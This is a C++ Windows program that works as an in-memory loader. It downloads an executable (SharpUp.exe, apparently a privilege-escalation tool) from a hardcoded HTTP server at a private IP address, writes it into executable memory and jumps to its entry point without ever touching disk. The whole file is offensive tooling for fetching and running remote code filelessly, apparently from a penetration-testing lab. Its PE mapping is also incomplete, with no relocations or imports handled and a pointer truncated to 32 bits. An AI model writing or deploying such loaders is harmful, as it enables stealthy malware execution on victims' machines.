#include <windows.h>
#include <wininet.h>
#include <iostream>

#pragma comment(lib, "wininet.lib")

// Function to download a file into memory
BYTE* DownloadFile(LPCSTR url, DWORD& fileSize) {
    HINTERNET hInternet = InternetOpen("MyAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
        return NULL;
    }

    HINTERNET hConnect = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        std::cerr << "InternetOpenUrl failed: " << GetLastError() << std::endl;
        InternetCloseHandle(hInternet);
        return NULL;
    }

    DWORD bytesRead = 0;
    fileSize = 0;
    BYTE* buffer = NULL;
    BYTE tempBuffer[1024];

    while (InternetReadFile(hConnect, tempBuffer, sizeof(tempBuffer), &bytesRead) && bytesRead != 0) {
        BYTE* newBuffer = new BYTE[fileSize + bytesRead];
        if (fileSize > 0) {
            memcpy(newBuffer, buffer, fileSize);
            delete[] buffer;
        }
        memcpy(newBuffer + fileSize, tempBuffer, bytesRead);
        buffer = newBuffer;
        fileSize += bytesRead;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return buffer;
}

// Function to execute a binary from memory
void ExecuteFromMemory(BYTE* buffer, DWORD size) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)buffer;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(buffer + dosHeader->e_lfanew);

    HANDLE hProcess = GetCurrentProcess();
    LPVOID baseAddress = VirtualAlloc(NULL, ntHeaders->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!baseAddress) {
        std::cerr << "VirtualAlloc failed: " << GetLastError() << std::endl;
        return;
    }

    memcpy(baseAddress, buffer, ntHeaders->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        memcpy((BYTE*)baseAddress + sectionHeader[i].VirtualAddress, buffer + sectionHeader[i].PointerToRawData, sectionHeader[i].SizeOfRawData);
    }

    DWORD entryPoint = (DWORD)baseAddress + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    ((void(*)())entryPoint)();
}

int main() {
    LPCSTR url = "http://192.168.45.188:8000/SharpUp.exe";
    DWORD fileSize = 0;

    BYTE* buffer = DownloadFile(url, fileSize);
    if (buffer) {
        ExecuteFromMemory(buffer, fileSize);
        delete[] buffer;
    } else {
        std::cerr << "Failed to download file" << std::endl;
    }

    return 0;
}
